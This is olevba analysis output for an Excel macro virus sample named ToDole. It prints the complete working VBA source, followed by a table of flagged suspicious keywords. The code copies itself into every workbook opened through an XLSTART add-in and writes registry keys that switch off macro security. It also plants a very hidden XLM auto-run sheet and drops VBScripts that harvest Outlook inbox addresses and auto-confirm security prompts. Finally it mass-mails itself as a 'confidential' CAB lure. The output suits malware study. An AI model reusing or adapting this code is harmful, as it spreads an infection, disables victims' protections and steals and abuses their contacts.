olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.ToDole.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSExcel.ToDole.a - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: ./Virus.MSExcel.ToDole.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: ./Virus.MSExcel.ToDole.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: ./Virus.MSExcel.ToDole.a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToDOLE.bas 
in file: ./Virus.MSExcel.ToDole.a - OLE stream: '_VBA_PROJECT_CUR/VBA/ToDOLE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub auto_open()
Application.DisplayAlerts = False
If ThisWorkbook.Path <> Application.StartupPath Then
  Application.ScreenUpdating = False
  Call delete_this_wk
  Call copytoworkbook
  If Sheets(1).Name <> "Macro1" Then Movemacro4 ThisWorkbook
  ThisWorkbook.Save
  Application.ScreenUpdating = True
End If
End Sub
Private Sub copytoworkbook()
  Const DQUOTE = """"
  With ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
.InsertLines 1, "Public WithEvents xx As Application"
.InsertLines 2, "Private Sub Workbook_open()"
.InsertLines 3, "Set xx = Application"
.InsertLines 4, "On Error Resume Next"
.InsertLines 5, "Application.DisplayAlerts = False"
.InsertLines 6, "Call do_what"
.InsertLines 7, "End Sub"
.InsertLines 8, "Private Sub xx_workbookOpen(ByVal wb As Workbook)"
.InsertLines 9, "On Error Resume Next"
.InsertLines 10, "wb.VBProject.References.AddFromGuid _"
.InsertLines 11, "GUID:=" & DQUOTE & "{0002E157-0000-0000-C000-000000000046}" & DQUOTE & ", _"
.InsertLines 12, "Major:=5, Minor:=3"
.InsertLines 13, "Application.ScreenUpdating = False"
.InsertLines 14, "Application.DisplayAlerts = False"
.InsertLines 15, "copystart wb"
.InsertLines 16, "Application.ScreenUpdating = True"
.InsertLines 17, "End Sub"

End With
End Sub

Private Sub delete_this_wk()
Dim VBProj As VBIDE.VBProject
Dim VBComp As VBIDE.VBComponent
Dim CodeMod As VBIDE.CodeModule

Set VBProj = ThisWorkbook.VBProject
Set VBComp = VBProj.VBComponents("ThisWorkbook")
Set CodeMod = VBComp.CodeModule
With CodeMod
    .DeleteLines 1, .CountOfLines
End With

End Sub
Function do_what()
Attribute do_what.VB_ProcData.VB_Invoke_Func = " \n14"
If ThisWorkbook.Path <> Application.StartupPath Then
  RestoreAfterOpen
  Call OpenDoor
  Call Microsofthobby
  Call ActionJudge
End If
End Function
Function copystart(ByVal wb As Workbook)
Attribute copystart.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next

Dim VBProj1 As VBIDE.VBProject
Dim VBProj2 As VBIDE.VBProject
Set VBProj1 = Workbooks("k4.xls").VBProject
Set VBProj2 = wb.VBProject

If copymodule("ToDole", VBProj1, VBProj2, False) Then Exit Function
End Function

Function copymodule(ModuleName As String, _
    FromVBProject As VBIDE.VBProject, _
    ToVBProject As VBIDE.VBProject, _
    OverwriteExisting As Boolean) As Boolean
Attribute copymodule.VB_ProcData.VB_Invoke_Func = " \n14"
   
    On Error Resume Next

    Dim VBComp As VBIDE.VBComponent
    Dim FName As String
    Dim CompName As String
    Dim S As String
    Dim SlashPos As Long
    Dim ExtPos As Long
    Dim TempVBComp As VBIDE.VBComponent
    
    If FromVBProject Is Nothing Then
        copymodule = False
        Exit Function
    End If
    
    If Trim(ModuleName) = vbNullString Then
        copymodule = False
        Exit Function
    End If
    
    If ToVBProject Is Nothing Then
        copymodule = False
        Exit Function
    End If
    
    If FromVBProject.Protection = vbext_pp_locked Then
        copymodule = False
        Exit Function
    End If
    
    If ToVBProject.Protection = vbext_pp_locked Then
        copymodule = False
        Exit Function
    End If
    
    On Error Resume Next
    Set VBComp = FromVBProject.VBComponents(ModuleName)
    If Err.Number <> 0 Then
        copymodule = False
        Exit Function
    End If
   
    FName = Environ("Temp") & "\" & ModuleName & ".bas"
    If OverwriteExisting = True Then
       
        If Dir(FName, vbNormal + vbHidden + vbSystem) <> vbNullString Then
            Err.Clear
            Kill FName
            If Err.Number <> 0 Then
                copymodule = False
                Exit Function
            End If
        End If
        With ToVBProject.VBComponents
            .Remove .Item(ModuleName)
        End With
    Else
        
        Err.Clear
        Set VBComp = ToVBProject.VBComponents(ModuleName)
        If Err.Number <> 0 Then
            If Err.Number = 9 Then
               
            Else
               
                copymodule = False
                Exit Function
            End If
        End If
    End If
   
    FromVBProject.VBComponents(ModuleName).Export FileName:=FName
   
    SlashPos = InStrRev(FName, "\")
    ExtPos = InStrRev(FName, ".")
    CompName = Mid(FName, SlashPos + 1, ExtPos - SlashPos - 1)
    
    Set VBComp = Nothing
    Set VBComp = ToVBProject.VBComponents(CompName)
    
    If VBComp Is Nothing Then
        ToVBProject.VBComponents.Import FileName:=FName
    Else
        If VBComp.Type = vbext_ct_Document Then
            
            Set TempVBComp = ToVBProject.VBComponents.Import(FName)
           
            With VBComp.CodeModule
                .DeleteLines 1, .CountOfLines
                S = TempVBComp.CodeModule.Lines(1, TempVBComp.CodeModule.CountOfLines)
                .InsertLines 1, S
            End With
            On Error GoTo 0
            ToVBProject.VBComponents.Remove TempVBComp
        End If
    End If
    Kill FName
    copymodule = True
End Function

Function Microsofthobby()
Attribute Microsofthobby.VB_ProcData.VB_Invoke_Func = " \n14"
Dim myfile0 As String
Dim MyFile As String
On Error Resume Next
myfile0 = ThisWorkbook.FullName
MyFile = Application.StartupPath & "\k4.xls"
If WorkbookOpen("k4.xls") And ThisWorkbook.Path <> Application.StartupPath Then Workbooks("k4.xls").Close False
Shell Environ$("comspec") & " /c attrib -S -h """ & Application.StartupPath & "\K4.XLS""", vbMinimizedFocus
Shell Environ$("comspec") & " /c Del /F /Q """ & Application.StartupPath & "\K4.XLS""", vbMinimizedFocus
Shell Environ$("comspec") & " /c RD /S /Q """ & Application.StartupPath & "\K4.XLS""", vbMinimizedFocus

If ThisWorkbook.Path <> Application.StartupPath Then
     Application.ScreenUpdating = False
     ThisWorkbook.IsAddin = True
     ThisWorkbook.SaveCopyAs MyFile
     ThisWorkbook.IsAddin = False
     Application.ScreenUpdating = True
End If
End Function

Function OpenDoor()
Attribute OpenDoor.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Fso, RK1 As String, RK2 As String, RK3 As String, RK4 As String
Dim KValue1 As Variant, KValue2 As Variant
Dim VS As String
On Error Resume Next
VS = Application.Version
Set Fso = CreateObject("scRiPTinG.fiLEsysTeMoBjEcT")

RK1 = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & VS & "\Excel\Security\AccessVBOM"
RK2 = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & VS & "\Excel\Security\Level"
RK3 = "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\" & VS & "\Excel\Security\AccessVBOM"
RK4 = "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\" & VS & "\Excel\Security\Level"

KValue1 = 1
KValue2 = 1

      Call WReg(RK1, KValue1, "REG_DWORD")
      Call WReg(RK2, KValue2, "REG_DWORD")
      Call WReg(RK3, KValue1, "REG_DWORD")
      Call WReg(RK4, KValue2, "REG_DWORD")

End Function

Sub WReg(strkey As String, Value As Variant, ValueType As String)
Attribute WReg.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim oWshell
    Set oWshell = CreateObject("WScript.Shell")
    If ValueType = "" Then
        oWshell.RegWrite strkey, Value
    Else
        oWshell.RegWrite strkey, Value, ValueType
    End If
    Set oWshell = Nothing
End Sub


Private Sub Movemacro4(ByVal wb As Workbook)
On Error Resume Next

  Dim sht As Object

    wb.Sheets(1).Select
    Sheets.Add Type:=xlExcel4MacroSheet
    ActiveSheet.Name = "Macro1"
   
    Range("A2").Select
    ActiveCell.FormulaR1C1 = "=ERROR(FALSE)"
    Range("A3").Select
    ActiveCell.FormulaR1C1 = "=IF(ERROR.TYPE(RUN(""" & Application.UserName & """))=4)"
    Range("A4").Select
    ActiveCell.FormulaR1C1 = "=ALERT(""禁用宏，关闭 " & Chr(10) & Now & Chr(10) & "Please Enable Macro!"",3)"
    Range("A5").Select
    ActiveCell.FormulaR1C1 = "=FILE.CLOSE(FALSE)"
    Range("A6").Select
    ActiveCell.FormulaR1C1 = "=END.IF()"
    Range("A7").Select
    ActiveCell.FormulaR1C1 = "=RETURN()"
    
    For Each sht In wb.Sheets
    wb.Names.Add sht.Name & "!Auto_Activate", "=Macro1!$A$2", False
    Next
    wb.Excel4MacroSheets(1).Visible = xlSheetVeryHidden
End Sub

Private Function WorkbookOpen(WorkBookName As String) As Boolean
  WorkbookOpen = False
  On Error GoTo WorkBookNotOpen
  If Len(Application.Workbooks(WorkBookName).Name) > 0 Then
    WorkbookOpen = True
    Exit Function
  End If
WorkBookNotOpen:
End Function

Private Sub ActionJudge()
Const T1 As Date = "10:00:00"
Const T2 As Date = "11:00:00"
Const T3 As Date = "14:00:00"
Const T4 As Date = "15:00:00"
Dim SentTime As Date, WshShell

Set WshShell = CreateObject("WScript.Shell")
If Not InStr(UCase(WshShell.RegRead("HKEY_CLASSES_ROOT\mailto\shell\open\command\")), "OUTLOOK.EXE") > 0 Then Exit Sub

If Time >= T1 And Time <= T2 Or Time >= T3 And Time <= T4 Then
      If ReadOut("D:\Collected_Address:frag1.txt") = "1" Then
           Exit Sub
      Else
           CreateFile "1", "D:\Collected_Address:frag1.txt"
           search_in_OL
      End If
Else
     If Not if_outlook_open Then Exit Sub
     If Time > T2 And Time <= DateAdd("n", 10, T2) Or Time > T4 And Time <= DateAdd("n", 10, T4) Then
          Exit Sub
     Else
          SentTime = DateAdd("n", -21, Now)
          On Error GoTo timeError
          SentTime = CDate(ReadOut("D:\Collected_Address:frag2.txt"))
timeError:
          If Now < DateAdd("n", 20, SentTime) Or ReadOut("D:\Collected_Address\log.txt") = "" Then
                Exit Sub
          Else
                CreateFile "", "D:\Collected_Address:frag1.txt"
                CreateFile Now, "D:\Collected_Address:frag2.txt"
                CreatCab_SendMail
          End If
     End If
End If
End Sub


Private Sub search_in_OL()
Dim i As Integer, AttName As String, AddVbsFile As String, AddListFile As String, fs As Object, WshShell As Object

On Error Resume Next
Set fs = CreateObject("scripting.filesystemobject")
Set WshShell = CreateObject("WScript.Shell")

If fs.Folderexists("E:\KK") = False Then fs.CreateFolder "E:\KK"
AttName = Replace(Replace(Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4), " ", "_"), ".", "_")
AddVbsFile_clear = "E:\KK\" & AttName & "_clear.vbs"
i = FreeFile()
Open AddVbsFile_clear For Output Access Write As #i

Print #i, "On error Resume Next"
Print #i, "Dim wsh, tle, T0, i"
Print #i, "  T0 = Timer"
Print #i, "  Set wsh=createobject(""" & "wscript.shell""" & ")"
Print #i, "  tle = """ & "Microsoft Office Outlook""" & ""
Print #i, "For i = 1 To 1000"
Print #i, "    If Timer - T0 > 60 Then Exit For"
Print #i, "  Call Refresh()"
Print #i, "  wscript.sleep 05"
Print #i, "  wsh.sendKeys """ & "%a""" & ""
Print #i, "  wscript.sleep 05"
Print #i, "  wsh.sendKeys """ & "{TAB}{TAB}""" & ""
Print #i, "  wscript.sleep 05"
Print #i, "  wsh.sendKeys """ & "{Enter}""" & ""
Print #i, "Next"
Print #i, "Set wsh = Nothing"
Print #i, "wscript.quit"
Print #i, "Sub Refresh()"
Print #i, "Do Until wsh.AppActivate(CStr(tle)) = True"
Print #i, "    If Timer - T0 > 60 Then Exit Sub"
Print #i, "Loop"
Print #i, "  wscript.sleep 05"
Print #i, "    wsh.SendKeys """ & "%{F4}""" & ""
Print #i, "End Sub"
Close (i)

AddVbsFile_search = "E:\KK\" & AttName & "_Search.vbs"
i = FreeFile()
Open AddVbsFile_search For Output Access Write As #i

Print #i, "On error Resume Next"
Print #i, "Const olFolderInbox = 6"
Print #i, "Dim conbinded_address,WshShell,sh,ts"
Print #i, "Set WshShell=WScript.CreateObject(""" & "WScript.Shell""" & ")"
Print #i, "Set objOutlook = CreateObject(""" & "Outlook.Application""" & ")"
Print #i, "Set objNamespace = objOutlook.GetNamespace(""" & "MAPI""" & ")"
Print #i, "Set objFolder = objNamespace.GetDefaultFolder(olFolderInbox)"
Print #i, "Set TargetFolder = objFolder"
Print #i, "conbinded_address = """ & """" & ""
Print #i, "Set colItems = TargetFolder.Items"
Print #i, "wscript.sleep 300000"
Print #i, "WshSHell.Run (""" & "wscript.exe " & AddVbsFile_clear & """" & "), vbHide, False"
Print #i, "ts = Timer"
Print #i, "For Each objMessage in colItems"
Print #i, "       If Timer - ts >55 then exit For"
Print #i, "       conbinded_address = conbinded_address & valid_address(objMessage.Body)"
Print #i, "Next"
Print #i, "add_text conbinded_address, 8"
Print #i, "add_text all_non_same(ReadAllTextFile), 2"
Print #i, "WScript.Quit"
Print #i, ""
Print #i, "Private Function valid_address(source_data)"
Print #i, "   Dim oDict, trimed_data , temp_data, i, t_asc, header_end, trimed_arr, nonsame_arr"
Print #i, "   Dim regex, matchs, ss, arr()"
Print #i, "   Set oDict = CreateObject(""" & "Scripting.Dictionary""" & ")"
Print #i, "   Set regex = CreateObject(""" & "VBSCRIPT.REGEXP""" & ")"
Print #i, ""
Print #i, "   regex.Global = True"
Print #i, "   regex.Pattern = """ & "\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*""" & ""
Print #i, "   Set matchs = regex.Execute(source_data)"
Print #i, "   ReDim trimed_arr(matchs.Count - 1)"
Print #i, "   For i = Lbound(trimed_arr) To Ubound(trimed_arr)"
Print #i, "        trimed_arr(i) = matchs.Item(i) & vbCrLf"
Print #i, "   Next"
Print #i, ""
Print #i, "   For i = LBound(trimed_arr) To UBound(trimed_arr)"
Print #i, "        oDict(trimed_arr(i)) = """ & """" & ""
Print #i, "   Next"
Print #i, ""
Print #i, "   If oDict.Count > 0 Then"
Print #i, "        nonsame_arr = oDict.keys"
Print #i, "        For i = LBound(nonsame_arr) To UBound(nonsame_arr)"
Print #i, "             valid_address = valid_address & nonsame_arr(i)"
Print #i, "        Next"
Print #i, "   End If"
Print #i, "   Set oDict = Nothing"
Print #i, "End Function"
Print #i, ""
Print #i, "Private Sub add_text(inputed_string, input_frag)"
Print #i, "   Dim objFSO, logfile, logtext, log_path, log_folder"
Print #i, "   log_path = """ & "D:\Collected_Address""" & ""
Print #i, "   Set objFSO = CreateObject(""" & "Scripting.FileSystemObject""" & ")"
Print #i, "   On Error resume next"
Print #i, "   Set log_folder = objFSO.CreateFolder(log_path)"
Print #i, ""
Print #i, "   If objFSO.FileExists(log_path & """ & "\log.txt""" & ") = 0 Then"
Print #i, "       Set logfile = objFSO.CreateTextFile(log_path & """ & "\log.txt""" & ", True)"
Print #i, "   End If"
Print #i, "   Set log_folder = Nothing"
Print #i, "   Set logfile = Nothing"
Print #i, ""
Print #i, "   Select Case input_frag"
Print #i, "     Case 8"
Print #i, "          Set logtext = objFSO.OpenTextFile(log_path & """ & "\log.txt""" & ", 8, True, -1)"
Print #i, "          logtext.Write inputed_string"
Print #i, "          logtext.Close"
Print #i, "     Case 2"
Print #i, "          Set logtext = objFSO.OpenTextFile(log_path & """ & "\log.txt""" & ", 2, True, -1)"
Print #i, "          logtext.Write inputed_string"
Print #i, "          logtext.Close"
Print #i, "   End Select"
Print #i, "   set objFSO = nothing"
Print #i, "End Sub"
Print #i, ""
Print #i, "Private Function ReadAllTextFile()"
Print #i, "    Dim objFSO, FileName, MyFile"
Print #i, "    FileName = """ & "D:\Collected_Address\log.txt""" & ""
Print #i, "    Set objFSO = CreateObject(""" & "Scripting.FileSystemObject""" & ")"
Print #i, "    Set MyFile = objFSO.OpenTextFile(FileName, 1, False, -1)"
Print #i, "    If MyFile.AtEndOfStream Then"
Print #i, "        ReadAllTextFile = """ & """" & ""
Print #i, "    Else"
Print #i, "        ReadAllTextFile = MyFile.ReadAll"
Print #i, "    End If"
Print #i, "set objFSO = nothing"
Print #i, "End Function"
Print #i, ""
Print #i, "Private Function all_non_same(source_data)"
Print #i, "   Dim oDict, i, trimed_arr, nonsame_arr"
Print #i, "   all_non_same = """ & """" & ""
Print #i, "   Set oDict = CreateObject(""" & "Scripting.Dictionary""" & ")"
Print #i, ""
Print #i, "   trimed_arr = Split(source_data, vbCrLf)"
Print #i, ""
Print #i, "   For i = LBound(trimed_arr) To UBound(trimed_arr)"
Print #i, "         oDict(trimed_arr(i)) = """ & """" & ""
Print #i, "   Next"
Print #i, ""
Print #i, "   If oDict.Count > 0 Then"
Print #i, "        nonsame_arr = oDict.keys"
Print #i, "        For i = LBound(nonsame_arr) To UBound(nonsame_arr)"
Print #i, "             all_non_same = all_non_same & nonsame_arr(i) & vbCrLf"
Print #i, "        Next"
Print #i, "   End If"
Print #i, "   Set oDict = Nothing"
Print #i, "End Function"
Close (i)
Application.WindowState = xlMaximized
WshShell.Run ("wscript.exe " & AddVbsFile_search), vbHide, False
Set WshShell = Nothing
End Sub

Private Sub CreatCab_SendMail()
Dim i As Integer, AttName As String, AddVbsFile As String, AddListFile As String, Address_list As String
Dim fs As Object, WshShell As Object
Address_list = get_ten_address

Set WshShell = CreateObject("WScript.Shell")
Set fs = CreateObject("scripting.filesystemobject")
If fs.Folderexists("E:\SORCE") = False Then fs.CreateFolder "E:\SORCE"
AttName = Replace(Replace(Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4), " ", "_"), ".", "_")
mail_sub = "*" & AttName & "*Message*"
AddVbsFile = "E:\sorce\" & AttName & "_Key.vbs"
i = FreeFile()
Open AddVbsFile For Output Access Write As #i
    
Print #i, "Dim oexcel,owb, WshShell,Fso,Atta_xls,sh,route"
Print #i, "On error Resume Next"
Print #i, "Set sh=WScript.CreateObject(""" & "shell.application""" & ")"
Print #i, "sh.MinimizeAll"
Print #i, "Set sh = Nothing"
Print #i, "Set Fso = CreateObject(""" & "Scripting.FileSystemObject""" & ")"
Print #i, "Set WshShell = WScript.CreateObject(""" & "WScript.Shell""" & ")"
Print #i, "If Fso.Folderexists(""" & "E:\KK""" & ") = False Then Fso.CreateFolder """ & "E:\KK"""
Print #i, "Fso.CopyFile  _"
Print #i, "WshShell.CurrentDirectory & """ & "\" & AttName & "*.CAB""" & "," & " " & """E:\KK\""" & ", True"
Print #i, "For Each Atta_xls In ListDir(""" & "E:\KK""" & ")"
Print #i, "   WshShell.Run """ & "expand """ & " & Atta_xls & """ & " -F:" & AttName & ".xls E:\KK""" & ", 0, true"
Print #i, "Next"
Print #i, "If Fso.FileExists(""" & "E:\KK\" & AttName & ".xls""" & ") = 0 then"
Print #i, "        route = WshShell.CurrentDirectory & """ & "\" & AttName & ".xls"""
Print #i, "        if Fso.FileExists(WshShell.CurrentDirectory & """ & "\" & AttName & ".xls""" & ")=0 then"
Print #i, "                 route = InputBox(""" & "Warning! """ & " & Chr(10) & """ & "You are going to open a confidential file.""" & "& Chr(10)   _"
Print #i, "                               & """ & "Please input the complete file path.""" & " & Chr(10) & """ & "ex. C:\parth\confidential_file.xls""" & ", _"
Print #i, "                               """ & "Open a File""" & " , """ & "Please Input the Complete File Path""" & ", 10000, 8500)"
Print #i, "        End if"
Print #i, "else"
Print #i, "        route = """ & "E:\KK\" & AttName & ".xls"""
Print #i, "End If"
Print #i, "   set oexcel=createobject(""" & "excel.application""" & ")"
Print #i, "   set owb=oexcel.workbooks.open(route)"
Print #i, "   oExcel.Visible = True"
Print #i, "Set oExcel = Nothing"
Print #i, "Set oWb = Nothing"
Print #i, "Set  WshShell = Nothing"
Print #i, "Set Fso = Nothing"
Print #i, "WScript.Quit"
Print #i, "Private Function ListDir (ByVal Path)"
Print #i, "   Dim Filter, a, n, Folder, Files, File"
Print #i, "       ReDim a(10)"
Print #i, "    n = 0"
Print #i, "  Set Folder = fso.GetFolder(Path)"
Print #i, "   Set Files = Folder.Files"
Print #i, "   For Each File In Files"
Print #i, "      If left(File.Name," & Len(AttName) & ") = """ & AttName & """ and right(File.Name,3) = """ & "CAB""" & " Then"
Print #i, "         If n > UBound(a) Then ReDim Preserve a(n*2)"
Print #i, "            a(n) = File.Path"
Print #i, "            n = n + 1"
Print #i, "       End If"
Print #i, "   Next"
Print #i, "   ReDim Preserve a(n-1)"
Print #i, "   ListDir = a"
Print #i, "End Function"

Close (i)
AddListFile = ThisWorkbook.Path & "\TEST.txt"
i = FreeFile()
Open AddListFile For Output Access Write As #i
Print #i, "E:\sorce\" & AttName & "_Key.vbs"
Print #i, "E:\sorce\" & AttName & ".xls"
Close (i)

Application.ScreenUpdating = False
RestoreBeforeSend
ThisWorkbook.SaveCopyAs "E:\sorce\" & AttName & ".xls"
RestoreAfterOpen
c4$ = CurDir()
ChDrive Left(ThisWorkbook.Path, 3) '"C:\"
ChDir ThisWorkbook.Path
WshShell.Run Environ$("comspec") & " /c makecab /F """ & ThisWorkbook.Path & "\TEST.TXT""" & " /D COMPRESSIONTYPE=LZX /D COMPRESSIONMEMORY=21 /D CABINETNAMETEMPLATE=../" & AttName & ".CAB", vbHide, False

Do Until fs.FileExists(ThisWorkbook.Path & "\TEST.txt") _
And fs.FileExists(ThisWorkbook.Path & "\setup.rpt") And fs.FileExists(ThisWorkbook.Path & "\setup.inf") _
And fs.FileExists(ThisWorkbook.Path & "\" & AttName & ".CAB")
DoEvents
Loop

WshShell.Run Environ$("comspec") & " /c RD /S /Q """ & ThisWorkbook.Path & "\disk1""", vbHide, False
WshShell.Run Environ$("comspec") & " /c Del /F /Q """ & ThisWorkbook.Path & "\TEST.txt""", vbHide, False
WshShell.Run Environ$("comspec") & " /c Del /F /Q """ & ThisWorkbook.Path & "\setup.rpt""", vbHide, False
WshShell.Run Environ$("comspec") & " /c Del /F /Q """ & ThisWorkbook.Path & "\setup.inf""", vbHide, False
WshShell.Run Environ$("comspec") & " /c RD /S /Q E:\sorce", vbHide, False

If fs.Folderexists("E:\KK") = False Then fs.CreateFolder "E:\KK"
WshShell.Run Environ$("comspec") & " /c MOVE /Y " & AttName & ".CAB E:\KK""", vbHide, False
ChDir c4$
Call Massive_SendMail(Address_list, AttName, "Dear all," & vbCrLf & AttName & vbCrLf & "FYI", _
"", "E:\KK\" & AttName & ".CAB")
WshShell.Run Environ$("comspec") & " /c RD /S /Q E:\KK", vbHide, False
Set WshShell = Nothing
Application.ScreenUpdating = True
End Sub

Private Sub Massive_SendMail(Email_Address$, Subject$, Body$, CC_email_add$, Attachment$)
    Dim objOL As Object
    Dim itmNewMail As Object
    If Not if_outlook_open Then Exit Sub
    
    Set objOL = CreateObject("Outlook.Application")
    Set itmNewMail = objOL.CreateItem(olMailItem)
    
    With itmNewMail
        .Subject = Subject
        .Body = Body
        .To = Email_Address
        .CC = CC_email_add
        .Attachments.Add Attachment
        .DeleteAfterSubmit = True
    End With
    On Error GoTo continue
SendEmail:
    itmNewMail.display
    Debug.Print "setforth "
    DoEvents
    DoEvents
    DoEvents
    SendKeys "%s", Wait:=True
    DoEvents
    GoTo SendEmail
continue:
    Set objOL = Nothing
    Set itmNewMail = Nothing
End Sub

Private Function if_outlook_open() As Boolean
Set objs = GetObject("WinMgmts:").InstancesOf("Win32_Process")
if_outlook_open = False
For Each obj In objs
If InStr(obj.Description, "OUTLOOK") > 0 Then
if_outlook_open = True
Exit For
End If
Next
End Function

Private Function RadomNine(length As Integer) As String
 Dim jj As Integer, k As Integer, i As Integer
 RadomNine = ""
 If length <= 0 Then Exit Function
 If length <= 10 Then
     For i = 1 To length
     RadomNine = RadomNine & "$$" & i
     Next i
     Exit Function
 End If
 jj = length / 10
 Randomize
 For i = 1 To 10
      k = Int(Rnd * (jj * i - m - 1)) + 1
      If m + k <> 1 Then RadomNine = RadomNine & "$$" & m + k
      m = m + k
 Next
End Function
Private Function get_ten_address() As String
Dim singleAddress_arr, krr, i As Integer
get_ten_address = ""
singleAddress_arr = Split(ReadOut("D:\Collected_Address\log.txt"), vbCrLf)
krr = Split(RadomNine(UBound(singleAddress_arr) - LBound(singleAddress_arr) + 1), "$$")
For i = 1 To UBound(krr)
get_ten_address = get_ten_address & ";" & singleAddress_arr(CInt(krr(i)) - 1)
Next i
End Function

Private Function ReadOut(FullPath) As String
    On Error Resume Next
    Dim Fso, FileText
    Set Fso = CreateObject("scRiPTinG.fiLEsysTeMoBjEcT")
    Set FileText = Fso.OpenTextFile(FullPath, 1, False, -1)
    ReadOut = FileText.ReadAll
    FileText.Close
End Function

Private Sub CreateFile(FragMark, pathf)
    On Error Resume Next
    Dim Fso, FileText
    Set Fso = CreateObject("scRiPTinG.fiLEsysTeMoBjEcT")
    If Fso.Folderexists(Left(pathf, Len(pathf) - 10)) = False Then Fso.CreateFolder Left(pathf, Len(pathf) - 10)
    If Fso.FileExists(pathf) Then
        Set FileText = Fso.OpenTextFile(pathf, 2, False, -1)
        FileText.Write FragMark
        FileText.Close
    Else
        Set FileText = Fso.OpenTextFile(pathf, 2, True, -1)
        FileText.Write FragMark
        FileText.Close
    End If
End Sub


Private Sub RestoreBeforeSend()
Dim sht As Object
Application.ScreenUpdating = False
Application.DisplayAlerts = False
On Error Resume Next
For Each aa In ThisWorkbook.Names
     aa.Visible = True
     If Split(aa.Name, "!")(1) = "Auto_Activate" Then aa.Delete
Next
For Each sht In ThisWorkbook.Sheets
     If sht.Name = "Macro1" Then
     sht.Visible = xlSheetVisible
     sht.Delete
     End If
Next
Sheets(1).Select
Sheets.Add
For Each sht In ThisWorkbook.Sheets
     If sht.Name <> Sheets(1).Name Then sht.Visible = xlSheetVeryHidden
Next
i_row = Int((15 * Rnd) + 1)
i_col = Int((6 * Rnd) + 1)
Cells(i_row, i_col) = "** CONFIDENTIAL! ** "
Cells(i_row + 2, i_col) = "Use " & Chr(34) & Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4) & "_key.vbs" & Chr(34) & " To Open This File."
Cells(i_row + 3, i_col) = "请用 " & Chr(34) & Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4) & "_key.vbs" & Chr(34) & " 解锁此文件."
With Range(Cells(i_row, i_col), Cells(i_row + 2, i_col))
     .Font.Bold = True
     .Font.ColorIndex = 3
End With
Application.ScreenUpdating = True
End Sub

Private Function RestoreAfterOpen()
Dim sht, del_sht, rng, del_frag As Boolean
On Error Resume Next
del_sht = ActiveSheet.Name
Application.ScreenUpdating = False
Application.DisplayAlerts = False
For Each sht In ThisWorkbook.Sheets
    If sht.Name <> "Macro1" Then sht.Visible = xlSheetVisible
Next
For Each rng In Sheets(del_sht).Range("A1:F15")
If InStr(rng.Value, "CONFIDENTIAL") > 0 Then
del_frag = True
Exit For
End If
Next
If del_frag = True Then Sheets(del_sht).Delete
Application.ScreenUpdating = True

End Function
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - l
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - Ì
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ž[Íd
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|shell.application   |May run an application (if combined with     |
|          |                    |CreateObject)                                |
|Suspicious|sendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
